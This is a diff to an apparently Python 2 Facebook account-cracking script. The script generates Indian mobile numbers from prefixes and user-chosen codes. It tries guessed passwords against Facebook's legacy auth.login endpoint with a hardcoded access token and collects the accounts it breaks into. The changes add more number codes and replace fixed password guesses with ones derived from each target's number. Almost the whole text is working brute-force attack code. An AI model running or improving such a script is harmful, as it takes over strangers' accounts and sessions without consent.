@@ -133,6 +133,7 @@ def action():
                 print "\033[1;91mENTER THE CODE HERE"
                 print "\033[1;95m536, 559, 621, 005, 198, 935, 936 "
                 print "\033[1;95m559, 621, 651, 695, 794, 956, 793,"
+                print "\033[1;95m180, 440, 441, 490, 491, 492, 493, 494,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+919"
@@ -149,6 +150,7 @@ def action():
                 print "\033[1;91mENTER THE CODE HERE"
                 print "\033[1;94m009, 127, 173, 174, 175,"
                 print "\033[1;95m400, 756, 853, 953,"
+                print "\033[1;95m331, 332, 333, 500, 985,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+918"
@@ -165,6 +167,7 @@ def action():
                 print "\033[1;91mENTER THE CODE HERE"
                 print "\033[1;94m388, 607, 897, 755,"
                 print "\033[1;95m755,"
+                print "\033[1;95m382,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+917"
@@ -256,7 +259,7 @@ def action():
                                                         cps.close()
                                                         cpb.append(c+user+pass2)
                                                 else:
-                                                        pass3 = '536559'
+                                                        pass3 = n['first_six_nmbr']
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
@@ -273,7 +276,7 @@ def action():
                                                                         cps.close()
                                                                         cpb.append(c+user+pass3)
                                                                 else:
-                                                                        pass4 = '956198'
+                                                                        pass4 = n['first_six_nmbr']
                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
